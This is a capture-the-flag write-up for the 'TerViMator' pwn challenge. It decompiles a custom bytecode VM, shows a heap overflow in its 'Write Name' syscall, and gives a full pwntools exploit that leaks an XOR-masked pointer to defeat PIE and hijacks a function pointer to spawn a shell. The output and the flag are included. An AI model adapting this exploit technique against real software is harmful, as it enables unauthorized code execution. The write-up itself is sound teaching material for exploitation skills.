
# TerViMator - CTF Writeup

**Challenge:** TerViMator
**Category:** Pwn / VM Escape / Reverse Engineering
**Command:** `ncat --ssl tervimator.ctf.prgy.in 1337`

> **Description:** Skynet is rising. Can you defeat this early version of the T-1000s mainframe before it becomes unstoppable?

---

## 1. Initial Analysis: The Loader

The binary implements a custom Virtual Machine. When we open it in Ghidra, the entry point is the `menu()` function. It disables buffering (standard for CTF challenges) and reads our raw bytecode input into a global buffer.

**Analysis:**
This function acts as the bootloader. It reads up to 4096 bytes of bytecode and then passes control to the CPU emulator.

```c
undefined8 menu(void)
{
  ssize_t sVar1;
  
  setvbuf(stdout,(char *)0x0,2,0);
  puts("TerViMator");
  puts("Waiting for bytecode...");
  
  // Reads bytecode into global memory
  sVar1 = read(0,&DAT_001051e0,0x1000);
  
  if ((int)sVar1 < 1) {
    exit(0);
  }
  
  puts("Executing...");
  functionFromMenu(); // Transfers control to VM
  return 0;
}

```

---

## 2. The VM Architecture

The core logic resides in `functionFromMenu`. This simulates a "Fetch-Decode-Execute" cycle. It uses a global array (`DAT_001051c0`) as a Register Bank and processes opcodes via a switch statement.

**Instruction Set Architecture (ISA):**

* **Opcodes 1-5:** Arithmetic and Data movement (MOV, ADD, XOR).
* **Opcode 6 (SYSCALL):** The most interesting instruction. It uses Register 0 as the syscall number to trigger native functions.

```c
void functionFromMenu(void)
{
  while ((DAT_00105010 != 0 && (DAT_001061e0 < 0x1000))) {
    uVar1 = FUN_001012cd(); // Fetch Byte
    switch(uVar1) {
    case 0:
      DAT_00105010 = 0; // HALT
      break;
    // ... (Cases 1-5: Arithmetic/Mov) ...
    case 6:
      switch(DAT_001051c0) { // Check Register 0
      default:
        error("Unknown Syscall");
        break;
      case 1:
        FUN_001013de(); // syscall1 (Alloc Data)
        break;
      case 2:
        FUN_00101523(); // syscall2 (Alloc Exec)
        break;
      // ... (Other syscalls) ...
      }
      break;
    }
  }
  return;
}

```

---

## 3. The Heap Structure

The VM implements a custom heap using a global array. Objects are allocated with **Syscall 1** (Data) and **Syscall 2** (Exec).

**Object Structure (24 bytes):**

* **Offset 0:** Data Buffer
* **Offset 8:** Flags (1=Read, 2=Write, 4=Exec)
* **Offset 9:** Type (1=Data, 2=Exec)
* **Offset 16:** Pointer (Data ptr or Function ptr)

```c
void syscall1(void) { // Alloc Data
  // ...
  memset(&DAT_00105040 + (long)(int)uVar2 * 0x18,0,0x18);
  (&DAT_00105049)[(long)(int)uVar2 * 0x18] = 1; // Type = 1 (Data)
  (&DAT_00105048)[(long)(int)uVar2 * 0x18] = 3; // Flags = 3 (Read | Write)
}

void syscall2(void) { // Alloc Exec
  // ...
  (&DAT_00105049)[(long)(int)uVar2 * 0x18] = 2; // Type = 2 (Exec)
  (&DAT_00105048)[(long)(int)uVar2 * 0x18] = 4; // Flags = 4 (Exec Only)
  
  // Function pointer is encrypted with XOR key
  *(ulong *)(&DAT_00105050 + (long)(int)uVar2 * 0x18) = (ulong)local_10 ^ 0x1a5bfe810dce5825; 
}

```

---

## 4. The Vulnerability: Heap Buffer Overflow

The vulnerability lies in **Syscall 5 (Write Name)**. It allows writing data into an object's buffer.

**The Bug:** The object size is strictly 24 bytes, but the check `if (0x40 < (int)uVar2)` allows writing up to **64 bytes**.

**Impact:** We can overflow from **Object N** into **Object N+1**, overwriting its metadata (Flags, Type) and its Function Pointer.

```c
void syscall5(void) { // Write Name
  // ...
  if (0x40 < (int)uVar2) { // Allow up to 64 bytes
    error("Name too long");
  }
  // Writing to an object of size 24 bytes -> OVERFLOW
  for (local_1c = 0; local_1c < (int)uVar2; local_1c = local_1c + 1) {
    read(0,&DAT_00105040 + (long)local_1c + (long)(int)uVar1 * 0x18,1);
  }
  return;
}

```

---

## 5. Exploit Strategy: Leak & Execution

### Step 1: Defeating PIE (The Leak)

We need to find the base address. We can leak an internal function pointer from a Type 2 (Exec) object.

* **Problem:** Syscall 7 (Read Byte) requires Read permission (Flag 1). Type 2 objects only have Exec permission (Flag 4).
* **Solution:** Use the overflow in Syscall 5 to overwrite the victim object's Flags byte to `7` (RWX), enabling the leak.

```c
void syscall7(void) { // Read Byte
  if (((&DAT_00105048)[(long)iVar1 * 0x18] & 1) == 0) { // Checks READ bit
    error("Permission Denied");
  }
  // ...
}

```

### Step 2: Code Execution

Once we calculate the address of the hidden `WinCon` function, we overwrite the function pointer of the victim object.

* **Constraint:** Syscall 8 (Exec) verifies object integrity. It checks if `Type == 2` and `Flags & 4 != 0`.
* **The Fix:** Our overflow payload must correctly reconstruct the header (Flags=7, Type=2) while overwriting the pointer.

```c
void WinCon(void) {
  puts("CRITICAL: PRIVILEGE ESCALATION.");
  system("/bin/sh");
  exit(0);
}

```

---

## 6. Final Exploit Script

We used Python and `pwntools` to script the interaction. A critical step was ensuring the `cat flag.txt` command was sent immediately after the shell popped to avoid EOF issues.

```python
from pwn import *

# Context setup
context.arch = 'amd64'

# --- CONNECTION SETUP ---
HOST = 'tervimator.ctf.prgy.in'
PORT = 1337
p = remote(HOST, PORT, ssl=True)

# Constants
KEY = 0x1a5bfe810dce5825
OFFSET_SYSCALL1 = 0x13de 
OFFSET_WINCON   = 0x129d 

def generate_bytecode():
    bytecode = b''

    # 1. Alloc Data (Object 0) - The Hammer
    bytecode += b'\x01\x00\x01\x00\x00\x00' + b'\x01\x01\x80\x00\x00\x00' + b'\x06'

    # 2. Alloc Exec (Object 1) - The Victim 
    bytecode += b'\x01\x00\x02\x00\x00\x00' + b'\x01\x01\x01\x00\x00\x00' + b'\x06'

    # 3. OVERFLOW 1: Change Permissions of Object 1
    # We write 33 bytes: 24 (Obj0) + 8 (Obj1 Pad) + 1 (Obj1 Flags)
    bytecode += b'\x01\x00\x05\x00\x00\x00' 
    bytecode += b'\x01\x01\x00\x00\x00\x00' 
    bytecode += b'\x01\x02\x21\x00\x00\x00' # Length 33
    bytecode += b'\x06'

    # 4. LEAK: Read Ptr from Object 1
    # We read offsets 0-7 because syscall7 reads from the Pointer Array directly.
    for i in range(8):
        bytecode += b'\x01\x00\x07\x00\x00\x00'
        bytecode += b'\x01\x01\x01\x00\x00\x00'
        bytecode += b'\x01\x02' + p32(i)
        bytecode += b'\x06'

    # 5. OVERFLOW 2: Overwrite Function Pointer (AND PRESERVE HEADERS!)
    # We write 48 bytes total.
    bytecode += b'\x01\x00\x05\x00\x00\x00'
    bytecode += b'\x01\x01\x00\x00\x00\x00'
    bytecode += b'\x01\x02\x30\x00\x00\x00' # Length 48
    bytecode += b'\x06'

    # 6. EXECUTE: Call Syscall 8 on Object 1
    bytecode += b'\x01\x00\x08\x00\x00\x00' + b'\x01\x01\x01\x00\x00\x00' + b'\x06'

    bytecode += b'\x00' # HALT
    return bytecode

# --- EXECUTION ---

log.info("Sending Bytecode...")
p.recvuntil(b"Waiting for bytecode...")
p.send(generate_bytecode())

# PAYLOAD 1: Change Permissions (Enable Read)
# Structure: [ Obj 0 Data (24) ] [ Obj 1 Pad (8) ] [ Obj 1 Flags (1) ]
payload_perms = b'A' * 24 + b'B' * 8 + b'\x07'
log.info("Sending Permission Overwrite Payload...")
p.recvuntil(b"Reading 33 bytes")
p.send(payload_perms)

# HANDLE LEAK
log.info("Receiving Leak...")
leaked_bytes = b""
for i in range(8):
    p.recvuntil(b": 0x")
    val = p.recvline().strip()
    leaked_bytes += p8(int(val, 16))

encrypted_ptr = u64(leaked_bytes)
real_syscall1 = encrypted_ptr ^ KEY
pie_base = real_syscall1 - OFFSET_SYSCALL1
wincon = pie_base + OFFSET_WINCON

log.success(f"PIE Base: {hex(pie_base)}")
log.success(f"WinCon:   {hex(wincon)}")

# PAYLOAD 2: Overwrite Pointer (CRITICAL FIX)
# We must preserve the Type and Flags in Object 1 so syscall8 doesn't panic.
# Structure:
# Bytes 0-23:   Obj 0 Data
# Bytes 24-31:  Obj 1 Padding
# Byte 32:      Obj 1 Flags -> MUST BE 7 (RWX)
# Byte 33:      Obj 1 Type  -> MUST BE 2 (Exec)
# Bytes 34-39:  Obj 1 Padding
# Bytes 40-47:  Obj 1 Pointer -> Target

payload_exploit = b'A' * 24            # Fill Obj 0
payload_exploit += b'B' * 8            # Fill Obj 1 offset 0-7
payload_exploit += b'\x07'             # Obj 1 Offset 8: Flags = RWX
payload_exploit += b'\x02'             # Obj 1 Offset 9: Type = Exec
payload_exploit += b'B' * 6            # Fill Obj 1 offset 10-15
payload_exploit += p64(wincon ^ KEY)   # Overwrite Ptr (Offset 16)

log.info("Sending Exploit Payload...")
p.recvuntil(b"Reading 48 bytes")
p.send(payload_exploit)

# Trigger flag read
log.success("Exploit sent! Checking for flag...")
import time
time.sleep(0.5) 
p.sendline(b"cat flag.txt") 
p.interactive()

```

### Output

```text
[*] Sending Bytecode...
[*] Sending Permission Overwrite Payload...
[*] Receiving Leak...
[+] PIE Base: 0x598353fa4000
[+] WinCon:   0x598353fa529d
[*] Sending Exploit Payload...
[+] Exploit sent! Checking for flag...
[*] Switching to interactive mode

Executing Task 0x598353fa529d...
CRITICAL: PRIVILEGE ESCALATION.
p_ctf{tErVIm4TOrT-1000ha$BE3nd3feaT3D}

```

**Flag:** `p_ctf{tErVIm4TOrT-1000ha$BE3nd3feaT3D}`
